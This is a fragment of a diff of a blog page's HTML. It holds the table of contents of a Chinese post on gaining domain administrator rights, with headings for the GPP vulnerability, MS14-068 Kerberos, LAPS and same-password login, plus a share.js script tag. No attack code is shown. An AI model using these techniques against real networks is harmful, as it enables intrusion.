toc-level-2"><a class="toc-link" href="#获取域管权限"><span class="toc-number">4.</span> <span class="toc-text">获取域管权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-组策略漏洞（GPP）"><span class="toc-number">4.1.</span> <span class="toc-text">0x01 组策略漏洞（GPP）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X02-MS14-068-KERBEROS漏洞"><span class="toc-number">4.2.</span> <span class="toc-text">0X02 MS14-068 KERBEROS漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X03-LAPS-LOCAL-ADMINISTRATOR-PASSWORD-SOLUTION"><span class="toc-number">4.3.</span> <span class="toc-text">0X03 LAPS(LOCAL ADMINISTRATOR PASSWORD SOLUTION)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X04-相同密码登录"><span class="toc-number">4.4.</span> <span class="toc-text">0X04 相同密码登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用漏洞配置、不当获取更多主机权限（获取敏感信息以最终控制整个域）"><span class="toc-number">4.5.</span> <span class="toc-text">利用漏洞配置、不当获取更多主机权限（获取敏感信息以最终控制整个域）</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -2365,6 +2342,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
